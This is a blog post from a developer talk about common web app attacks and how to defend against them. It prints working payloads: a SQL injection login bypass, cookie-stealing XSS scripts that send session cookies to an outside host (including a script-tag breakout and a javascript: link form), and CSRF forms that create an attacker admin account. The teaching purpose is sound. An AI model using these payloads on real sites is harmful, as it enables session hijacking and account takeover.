---
title: "How to secure your web apps (at least a little bit)"
date: 2019-03-10T10:05:39+01:00
description: "This is a write up of my recent (if can call October 2018 recent) talk that I gave for my colleagues. It's about typical attack vectors used against web-apps and how to decrease the attack surface of the apps."
coverCredit: "https://github.com/dmahlow"
tocEnabled: true
keywords: ["web", "sql", "xss", "csrf", "csp", "cors", "vulnerability"]
---

# Disclaimer

I'm not a security expert, please check every word I write.

Although, I have some experience in basic pen-testing and I have exposed some vulnerabilities in the past, I don't consider myself an expert in this area. There are people out there whose full-time job is information security and I'm not going to pretend I'm one of them. I just do some [CTFs](https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security) as a hobby and build software as my daily job, so it gives me enough knowledge to write such articles and give such talks but does not make me an expert.

# Definitions

I figured the best way to start is to make sure we're all aligned on some important definitions in this area such as:

* [UGC](https://en.wikipedia.org/wiki/User-generated_content) — User-Generated Content. Basically, everything displayed in your system created by users. e.g. Tweets, Facebook posts, Medium articles, etc.
* [Hacker](https://en.wikipedia.org/wiki/Hacker) — thanks to media and movie makers that's the most confusing one for people. Simply speaking, it's a person who can quickly figure out how things work. Being a hacker does not immediately mean being a criminal and it's important to understand.
* [Black hat](https://en.wikipedia.org/wiki/Black_hat) — well, if you still can't resist to blame hackers for all the hacked accounts and exposed data, you'll be after these people. Hackers who are driven by illegal intentions and/or hack for their own profit are called black hats in the infosec community.
* [White hat](https://en.wikipedia.org/wiki/White_hat_(computer_security)) — and white hats are "good folks" because they're researches and they report their findings, so black hat hackers can't use these vulnerabilities.
* [Attack vector](https://en.wikipedia.org/wiki/Vector_(malware)) — a method/way how something (e.g. software, hardware, people) can be possibly exploited by an attacker. For example, you might have heard of SQL injections, XSS, CSRF, buffer overflow, etc. This article will cover some of those.
* [Attack surface](https://en.wikipedia.org/wiki/Attack_surface) — the definition says it's "the sum of the different points (the "attack vectors")" but I'd say it's any part of your system that's exposed to the world. In the context of web apps, it's all the endpoints and open ports your web-app/server has which are available from the internet.

Now, we're done with the definitions, let's talk about Web.

# Attack surface

I think web-apps have one of the largest attack surfaces. And it's in their nature, just think about it: your browser is a program that downloads other programs from the internet and executes them trying to keep these programs in the browser sandbox. Sounds scary, right? At least it does for me.

So, what makes the attack surface of web-apps so large?

## Receiving and processing data

Unless it’s a static web-site, web-apps are meant to interact with users and that means they receive and process data from the users. And the history shows us it's very hard to make it secure because you need to sanitize the data properly before you actually process it.

## Browsers

Nowadays web-apps are mostly running in a browser (JavaScript). Sure, there are mobile apps that just use APIs but some of them still use web-views which are eventually browsers. The problem with that is you don't control that environment as a developer. The server is the only environment which is under your control in this case. For example, there are tons of malicious browser extensions out there which can steal your user's data and then sell it on the dark web but in the end it hurts your company when the database of your users is on sale.

## Web-standards and APIs

Web-standards (which are many) are not under your control when your build an app but, in fact, they’re a huge part of your app. That's the point not many people think about. What if someone finds a vulnerability in something so fundemential as a web-standard? Your app will be automatically exposed for attacks then, and usually there is nothing you can do about it until the standard is fixed.

For example, in 2016 [Mathias Bynens](https://twitter.com/mathias) discovered that [any link that opens a new tab of you browser actually lets the new tab to make changes in your previous one](https://mathiasbynens.github.io/rel-noopener/).

And what's the big deal you might ask? Well, let's imagine you do the following:

* You see a Facebook post with an interesting link
* You open the link, read the content
* You go back to the Facebook tab and you see the Facebook login page

What would you do?

Most of the users would think "well, happens sometimes, I get logged out all the time" and they would try to login again. And the same moment you would send your password to an attacker. Why? Because that was not the Facebook page, sure it looked like it was but it's simpler than you think to do so. Did you actually check the URL? How often do you check the website URL?

This is why such things is a very big deal because most people are not paranoid and they trust things they see. And, by the way, it actually worked on Facebook for some time, I checked it myself.

# Attack vectors

Let's talk business, how do people actually attack web-apps?

I'm pretty sure that if you worked on web-apps in your lifetime you most likely have heard of most of the attack vectors I listed next. But just theory would not be fun right? You can read the theoretical part in tons of other articles on the internet, so I prepared a [demo web-app](https://github.com/rdner/security-nightmare) that you're free to run on your computer and follow demo examples there.

## Sensitive data exposure

### How to attack

I know, sounds very generic and obvious but you'd be surprised to know what people do in real world. Some very confidential data can be served as a part of the API response or can be put in logs.

For example, security researcher [Vincent Haupert](https://www.vincent-haupert.de/) gave a talk "[Shut up and take my money](https://media.ccc.de/v/33c3-7969-shut_up_and_take_my_money)" at [33c3](https://media.ccc.de/c/33c3) in 2016. The talk was about a German bank [N26](https://n26.com/en-eu/). He hacked their mobile app, so he was able to steal money and eventually the whole account of another person. One of the reasons he could do that was some sensitive data served from their API.

Another example, which for some reason didn't receive so much attention, is [Twitter](https://www.reuters.com/article/us-twitter-passwords/twitter-says-glitch-exposed-substantial-number-of-users-passwords-idUSKBN1I42JG?il=0) and [Github](https://gizmodo.com/github-tells-some-users-it-accidentally-stored-their-pa-1825702783) were adding user passwords to their logs every time users logged in. That means, every engineer (likely not just engineers) could access your password for a long time until May 2018. I suspect they started working on GDPR compliance and found this issue in the process. Who can make sure that there is no one at Twitter and Github who could collect these passwords and sell them on the dark web?

### Consequences

In general, if you expose any sensitive data in your apps or APIs it enables attackers to impersonate users, steal their accounts and, what can be much worse, their identity.

### How to protect

* **NEVER** log any sensitive data, you can't just log every single request body using the same function, every single endpoint should be analyzed individually.
* **NEVER** propagate software errors / exception to the user. It most likely won't help the user to understand the error anyway but for an attacker it's always a huge help. I saw web-sites that in case of error showed me all database connection details including credentials. Some errors can indicate that certain attack vectors work for your web-site, like SQL injections.
* **NEVER** include any information to the response which is not supposed to be displayed on the UI. It's very important, if you feel like you can't show it to the user you should not serve it from your app at all.

I already hear some questions like: "But how am I suppose to debug a bug that user found then?".

Well, if you're really struggling with reproducing reported bugs or you can't find any information in your tracing system probably you should implement encrypted error bodies.

Once I got a 500 error from Google and guess what: I got a generic error message like "Internal server error" and something like "Please contact our support providing this text below". And the text below was just an encrypted text. I assume they encrypt every error exposed outside and then they have an internal tool to decrypt the message and view stack traces, error details, etc. It's actually fairly easy to implement, just don't be lazy.

## SQL injection

This one can be called a classic attack vector for web-apps. I used this to attack web-sites since I was 14 yo and surprisingly even today you can find some web-apps that are vulnerable despite the fact that there are tons of SQL libraries that handle this type of things for you.

### How to attack

As the name suggests you inject some additional statements/parameters to the existing SQL query on the server because this server does not sanitize your input very well.

There can be many ways to do so, but mostly you can find it with web-site input fields or URL query parameters.

If there is some kind of string input on the website that performs a SQL query you can assume that the query would look something like (e.g. for authentication):

```sql
SELECT user_id
FROM users
WHERE username = 'root' AND password = '9c42a1346e333a770904b2a2b37fa7d3'
```

But it's a prepared statement, what about how the app actually builds it? And here developers can have some trouble if they decided to implement it themselves.

Have a look at the following example:

```go
fmt.Printf(
  "SELECT user_id FROM users WHERE username = '%s' AND password = '%s'",
  username, md5(password)
)
```

This is a huge red flag here. Why? What happens when we input a username `root' OR 1=1-- `?

We will have this SQL query built:

```sql
SELECT user_id
FROM users
WHERE username = 'root' OR 1=1-- ' AND password = '9c42a1346e333a770904b2a2b37fa7d3'
```

What happened here is we injected a new condition to the `WHERE` statement which basically says "select a user with a name 'root' or where 1=1" but the thing is — in our universe `1` always equals `1` and that query would select all users from the database. The `-- ` part in the end is just to say "everything else is a SQL comment, so just ignore it". What happens next entirely depends on the server implementation really, but people usually take the first row from the query result and call it a successful authentication and you're in as an attacker. If you want to impersonate a particular user that you know 100% exists, like `root` or `admin` for example, you just swap `OR` with `AND` in this case, so the query says "select a user with a name 'root' and where 1=1". This query actually returns a row, so it's even more likely that the server would not fail and would process the result correctly.

There are many types of SQL injections which I'm not going to cover in this article (deserves a full dedicated article maybe?) but just so you know, an attacker can also update, delete or even extract your entire database via such SQL injection. And it's not just about string parameters, number parameters are even worse.

There is a very cool tool called [sqlmap](http://sqlmap.org/) that pen-testers use for such occasions, so highly recommended to learn how to use it and try to scan your web-app maybe. I remember writing complex scripts for the things this tool does and was very happy to learn that such tool exists.

Also, there is an OWASP page [here](https://www.owasp.org/index.php/SQL_Injection). OWASP is a non-for-profit security-focused organization that collects a wikipedia-like database describing attack vectors and vulnerabilities.

### Consequences

The attacker is able to:

* Bypass authentication
* Alter or destroy your database (hope you have backups, right?)
* Get access to your entire database and download it

### How to protect

* **NEVER** use string interpolation or concatenation, don't implement SQL builders yourself
* **ALWAYS** use a library that sanitizes query parameters properly

## Cross-site scripting (XSS)

If SQL injection attack was against the server this is one is against the clients — browsers. I'm pretty sure that everybody who's using the internet knows that browsers run JavaScript to make your user experience more interactive, so you don't have to request the whole page from the server every time you need to render a word. But everything comes with a cost and JavaScript is not an exception. The nature of the XSS attack vector is rendering of some malicious UGC that contains JavaScript code and the browser mistakenly evaluates this JavaScript which it should not.

This attack most likely would not affect your server much, but it can actually steal sessions of your users which can definitely affect your company and reputation particularly.

### How to attack

Again, there are many ways to execute this depending on your goals but if I were to steal active user sessions on a vulnerable web-site I'd post the following on a public feed that users most likely to see:

```html
<script>
  var e=document.createElement('img');
  e.src='https://rdner.de/inbox?sess='+encodeURIComponent(document.cookie);
  document.body.appendChild(e);
</script>
```

If the web-site does not escape the output properly this is what happens:

* The `<script>` tag tells the browser to start evaluating the expression inside the tag
* Then the code creates a new `img` element, sets the source of the image as `'https://rdner.de/inbox?sess='+encodeURIComponent(document.cookie)` and the `encodeURIComponent(document.cookie)` part actually extracts all your cookies including your current web-site session identifier that can be used to impersonate you from another browser by the attacker (in this case me).
* The `img` element is appended to the page which means the browser makes a request with the URL I set to fetch the image and display it. The browser does not care what URL you put there, it just tries to request the content. And yes, your [CORS policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) does not matter here at all.
* I collected all the sessions I received via such requests and I can set these cookies in my browser and get access to your account, see any data there, post on your behalf and maybe convince your friends to send me some money.

We can make it even better actually serving an image from `https://rdner.de/inbox` so the post does not look suspicious.

As mentioned, the goals can vary. Some people exploit XSS to perform a [DDoS](https://en.wikipedia.org/wiki/Denial-of-service_attack) (distributed denial-of-service) attack against another web-site other people mine crypto-currencies via XSS.

Other important things to mention

White-listing certain tags (like some early PHP libraries did) would not work, because you can actually run this attack via any tag using:

```html
<totally-custom-tag onmouseover="<same code here>">
  Long interesting text
</totally-custom-tag>
```

If you serve user content as inline JSON like so:

```html
<!DOCTYPE HTML>
<html>
  <head>
    <script>
	  var data = {
		  post: 'some UGC here'
	  };
	</script>
  </head>
  <body>
   ...
  </body>
</html>
```

then it's broken because if I put:

```html
</script>
<script>
  var e=document.createElement('img');
  e.src='https://rdner.de/inbox?sess='+encodeURIComponent(document.cookie);
  document.body.appendChild(e);
</script>
```

in there it will be evaluated.

I see people being shocked when I tell them about it, but yes, this is how it works and there is a reason for that.

In the past there was a plan that browsers would support different programming languages not just JavaScript, Microsoft was planning on [pushing VBScript](https://en.wikipedia.org/wiki/VBScript#Environments), for example. As a result, browsers could not implement any syntax awareness for the code in `script` tags. The browser is just simply looking for a `</script>` string to end the code evaluation even if it's a part of a JavaScript string. So, as you might have noticed our malicious string actually starts with a closing `script` tag and we immediately open a new one with our own code.

Some time ago, on the rise of [isomorphic JavaScript](https://en.wikipedia.org/wiki/Isomorphic_JavaScript) frameworks it was the most often vulnerability that I was finding. Most of the isomorphic frameworks computed the page state on server and then included the computed state object into the page so the front-end part of the app does not have to re-compute the state again. So, even though the apps properly escaped the content before it was displayed, the apps were vulnerable because of that data insertion.

Another option to perform an XSS attack (although most of the modern browsers actually detect and prevent it) can be putting your code as a part of the URL (e.g. query string parameter) if you noticed that the web-site renders this part of the URL on the page with no escaping. Then just give this link to someone and the rest you know.

### Consequences

The attacker is able to:

* Get access to your user accounts (maybe you got lucky and none of them was an admin)
* Execute any client-side code for your web-site visitors, causing traffic to other web-sites or malicious messages.

### How to protect

Like it was with SQL injections, it's all about sanitizing user input but in this case you can choose when you actually do that: you can forbid users from inputting certain characters (which is in my opinion a bad user experience) or you can escape the data when you actually render it on the web-site using [HTML entities](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).

Also, try not to put any UGC into the page as a part of the code, if you can't overcome this requirement make sure that the `</script>` sub-string is split into `'</' + 'script>'`, for example.

## Anchor abuse

To be honest, I'm not sure if anyone call it like this, so I probably coined the term here.

I've already briefly mentioned this in the [Web-standards and APIs](#web-standards-and-apis) section but links on pages can be very dangerous. So, think twice before clicking a link.

### How to attack

This type of attack is related to XSS because if you let your users to put unfiltered UGC in `href` link attributes on your web-site, you basically let them run XSS.

```html
<a href="javascript:var e=document.createElement('img');e.src='https://rdner.de/inbox?sess='+encodeURIComponent(document.cookie);document.body.appendChild(e);">
  Click me!
</a>
```

Clicking this link means sending your cookies/session to an attacker.

Besides that, when you go to any website via a link, keep in mind that the new website always knows from what URL you came, because there is JavaScript API `document.referrer` to get this information. So, if there is something sensitive in your URL it will be exposed via links opening.

I've already told you [earlier](#web-standards-and-apis) about the [vulnerability](https://mathiasbynens.github.io/rel-noopener/) that [Mathias Bynens](https://twitter.com/mathias) found in 2016 which lets an attacker site to change the content of another browser tab where the malicious link was opened from.

### Consequences

* Same as XSS
* Exposing sensitive data from URL
* Giving away your credentials on a phishing page

### How to protect

* Don't allow any schema except `http:` and `https:` in your URLs if they are created by your users
* Build a proxy page where your users go after they click an external link, this proxy filters out all the things like `document.referrer`
* **NEVER** store sensitive data in URLs, like access tokens, they can get leaked
* **ALWAYS** use `rel="noopener noreferrer"` attribute for your external links

## Cross Site Request Forgery (CSRF)

A lot of developers I meet know about CSRF tokens and that they should use a library to implement it on their web-sites but not many people actually know what they protect against.

### How to attack

So, what is it and how an attacker can exploit the vulnerability? Imagine you have an endpoint on a closed (invitation only) website where administrators create new users, also they can select what privileges the users have when they create them and the whole HTML of that form looks like this:


```html
<form method="post" action="/users">
  Email: <input type="text" name="email">
  Is admin? <input type="checkbox" name="isadmin">
  <input type="submit" value="Create">
</form>
```

When you submit this form it sends a POST request to the `/users` endpoint, the request cookie contains the current administrator session and the request body contains this data: `email=denis%40rdner.de&isadmin=on`. After the request is successfully handled by the server, it sends an invitation to the given email and provides credentials for the user giving it administrative privileges.

Simple, right? I've seen hundreds of web-sites like this in my early years. What's the problem with this?

Well, the problem is that you can send this request from any other web-site, the form does not have to be on your web-site, it can be anywhere else on the internet and it's still able to send the same request to your `/users` endpoint tricking the administrator into it, for example having this form instead.

```html
<form method="post" action="https://rdner.de/admin/users">
  Would you like to subscribe to our newsletter?
  Email: <input type="text" name="we-dont-care">
  <input type="hidden" name="email" value="attacker@gmail.com">
  <input type="hidden" name="isadmin" value="on">
  <input type="submit" value="Subscribe">
</form>
```

This form above would send a POST request to your `/users` endpoint (even if it's on a different domain) with the request body `we-dont-care=some%40gmail.com&email=attacker%40gmail.com&isadmin=on` (which is exactly the same as it was first time but contains the email of the attacker). As you can see, we show a fake input for an email and pretend we're going to use it for a newsletter subscription but in fact we have two other hidden input fields with real data we're going to send to the server.

What about administrator permissions you need to perform this request, you might ask? Well cookies work by domains, if you're an admin on `rdner.de` and you submit this form on `example.com` it will redirect you to `rdner.de` where your administrative permissions work and your cookie that identifies your session will be automatically sent to `rdner.de`, so the request will be successfully handled and the user for the attacker email `attacker@gmail.com` will be created and the attacker will become an administrator of your system.

This is what request cross site request forgery means. And again, the [CORS policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) would not help here.

By the way, if you don't use POST/PUT as your HTTP methods on such endpoints it's even worse. The attacker would just need to put an image

```html
<img href="https://rdner.de/admin/users?operation=create&email=attacker%40gmail.com&isadmin=on">
```
on their web-site and it's enough to open this page by an administrator in order to create a user for the attacker.

### Consequences

The attacker is able to:

Impersonate a user and perform a request on its behalf gaining administrative permissions, updating, deleting other users (in older systems that use POST for this), etc.

### How to protect

Okay, now I hope you understand the problem, let's talk about CSRF protection which is a CSRF token.

There are several different ways of implementing the CSRF token but I personally prefer the [encrypted token pattern](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet#Encrypted_Token_Pattern).

To implement it you just need to generate an encryption pass-phrase for you app and store it in a secure way. Then in your app implementation generate a new JSON object that contains:

* Some random value (for the sake of entropy)
* Some kind of ID (can be the ID of the current user)
* The generation time-stamp (so you can expire the token)

Once you have it, you can encrypt this JSON object with [AES256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)/[GCM](https://en.wikipedia.org/wiki/Galois/Counter_Mode) using the pass-phrase you've generated earlier. AES256 is the strongest encryption standard at the moment, GCM is a mode of operation that allows you to verify if the encrypted content is unchanged by an attacker. Unlike GCM most of the operation modes guarantee you confidentiality but not integrity, that means nobody can read the encrypted data but it's possible to change it. Theoretically, with some luck, it's possible to hit right bits and change the encrypted JSON in a way that works for the attacker's benefit. But I'd say it's extremely unlikely, especially if you have a limited expiration time for the token.

So, you have the token, now what? Depends on your app implementation but if you generate the form on server it's simple as changing the form to look like this:

```html
<form method="post" action="/users">
  Email: <input type="text" name="email">
  Is admin? <input type="checkbox" name="isadmin">
  <input type="hidden" name="csrf" value="some_encrypted_token_value_here">
  <input type="submit" value="Create">
</form>
```

This form will include the token into the request body and you can check its validity on server and accept or reject the request based on that. This guaranties you that the request comes from the form that was generated on your page and nowhere else.

## iframe-related vectors

It used to be very big in the past but now it's mostly about phishing.

### How to attack

As you [might know](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) people can use `iframe` element to embed other web-sites in their page. And it does not sound like much first but it means that they can also put any elements on top of this `iframe`, something like absolutely-positioned inputs. It can trick users into typing some data like credentials to the attacker's inputs when they think they interact with a real web-site.

In old versions of IE it was possible to catch all keyboard events from an `iframe` and implement something like a key logger but it's all in the past now, so we should not care much. However, who knows how many `iframe`-related bugs are still there.

### Consequences

The attacker is able to use phishing techniques and trick users into giving away their personal data.

### How to protect

It's a very good idea to forbid browsers to embed your web-site in an `iframe`. You have 2 options to do so:

* Serve `X-Frame-Options: deny` header
* Use [CSP](https://content-security-policy.com/) directive `frame-ancestors 'none'`, we'll also talk about CSP a bit later.

## Unrestricted file upload

This is one was particularly big when node.js got popular and everyone started exposing their apps to the public with no proxy in front of it.

### How to attack

You see, in node.js there is no default upload limit for an HTTP request, so if you see code like this:

```javascript
var data = '';
response.on('data', function(chunk) {
  data += chunk.toString();
});
response.on('end', function() {
  store(data);
});
```

You can't run this code on its own because it does not have any upload limit and an attacker can stream data into the server with no limit until the server crashes with `OutOfMemory` exception. In this case, no data, permissions, access would leak but it's a good attack vector to cause [DoS](https://en.wikipedia.org/wiki/Denial-of-service_attack) (denial of service). So, your web-site becomes unusable for normal users. Also, if you server just pipes the stream to the file system it can cause the file system to get full and in some cases you would not be able to start the server again.

### Consequences

The attacker is able to crash your server and cause denial of service.

### How to protect

The easiest option is to have some kind of proxy in front of your web-service, like NGINX. Most of the web-servers/proxies have a decent default configuration that includes upstream limiting. Or set/implement these limits in your app.

# Preventive measures

If you start thinking about security aspects of your app from the very beginning, including design steps, you will probably design/configure/deploy it in a way that would prevent most of the listed attacks. And there are some standards/technologies that can help you do that.

## Cross-Origin Resource Sharing (CORS)

I know, I mentioned several times that [CORS](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) would not help against CSRF and XSS vulnerabilites but it's actually good against some other [AJAX](https://en.wikipedia.org/wiki/Ajax_%28programming%29)-relates attack vectors, so it's a good idea to configure CORS as strict as possible for your app.

Some things you can do using CORS:

* Limit where your HTTP API can be accessed from
* Limit what headers are allowed in requests
* Limit what HTTP methods are allowed in requests

In order to do so your HTTP API must support `OPTIONS` requests with following headers:

* Access-Control-Allow-Origin
* Access-Control-Allow-Methods
* Access-Control-Allow-Headers
* etc.

There is a very good documentation regarding CORS configuration on MDN, so please [read it](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).

## Content Security Policy (CSP)

[CSP](https://content-security-policy.com/) is a very powerful tool when it comes to strict web-app policies.

Header `Content-Security-Policy` is supported by browsers since 2014-2015.

Features:

* Limit where to download media from: fonts, styles, scripts. You can even sign or limit to a certain [SHA](https://en.wikipedia.org/wiki/Secure_Hash_Algorithms)
* Limit where the app can make AJAX requests
* Limit what frames are allowed and if it’s allowed to embed the web-app in an `iframe`
* Limit where to submit forms from the page
* Sandbox mode – disable/enable JavaScript, modals, pop-ups, forms, etc

Crucial for high-security parts of your app like a login form or when you allow external user-defined content on your page.

Read more at [content-security-policy.com](https://content-security-policy.com/).

# Before you go

I hope you've learned something new from this article and with all of this in mind you will design your next project better and more secure.

Once I read the article "[Why I’m done with Chrome](https://blog.cryptographyengineering.com/2018/09/23/why-im-leaving-chrome/)" by Matthew Green and I really liked the phrase he used there:

>Trust is not a renewable resource

Because it's really not, even recent events with Facebook can prove this point. Does not matter how big the company is, it's really hard to earn the trust back after you failed your users. It's much better to spend more time thinking, planning, building a stronger app than solve a PR nightmare and be sorry.

# Links

* Open Web-Application Security Project https://www.owasp.org – basically wikipedia-like source about web-security
* [Top 10 vulnerabilities 2017](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)
* [Demo project on Github](https://github.com/rdner/security-nightmare) I prepared for the listed attack vectors
* Since this article is a talk write up, here is [my slides](slides.pdf) for the given talk.

If you have any feedback about the article please feel free to contact me via email [denis@rdner.de](mailto:denis@rdner.de).
